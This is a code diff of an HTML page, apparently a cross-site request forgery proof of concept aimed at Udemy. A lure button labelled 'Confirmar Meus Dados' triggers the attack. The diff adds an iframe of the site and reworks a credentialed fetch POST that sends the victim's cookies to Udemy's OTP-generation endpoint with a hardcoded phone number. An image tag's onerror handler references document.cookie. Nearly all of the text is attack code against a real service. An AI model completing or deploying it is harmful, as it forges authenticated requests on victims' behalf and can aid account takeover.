@@ -19,16 +19,28 @@
         <button id="confirm-button" onclick="executeCsrf()">Confirmar Meus Dados</button>
     </div>
     <img src="https://www.udemy.com/join/passwordless-auth/?locale=en_US" onerror="document.cookie" />
+    <iframe src="https://www.udemy.com" width="600" height="600" />
     <script>
         async function getData() {
               const url = "https://www.udemy.com/api-2.0/auth/non-auth-otp/generate/";
               try {
                 const response = await fetch(url, {
                   method: "POST",
-                  credential: "include",
-                "Content-Type": "application/json",
-                  body: JSON.stringify({ "purpose":3,"phone_number":"+5514996810417" }),
+                  mode: "cors",                // opcional, mais explícito
+                  credentials: "include",      // envia cookies (ou 'same-origin' se for mesmo domínio)
+                  headers: {
+                    "Content-Type": "application/json",
+                    "Accept": "application/json",
+                    // adicione aqui qualquer header custom que o servidor espere, ex:
+                    // "X-CSRF-Token": "valor", 
+                    "X-Requested-With": "XMLHttpRequest"
+                  },
+                  body: JSON.stringify({
+                    purpose: 3,
+                    phone_number: "+5514996810417"
+                  })
                 });
+
                 if (!response.ok) {
                   throw new Error(`Response status: ${response.status}`);
                 }
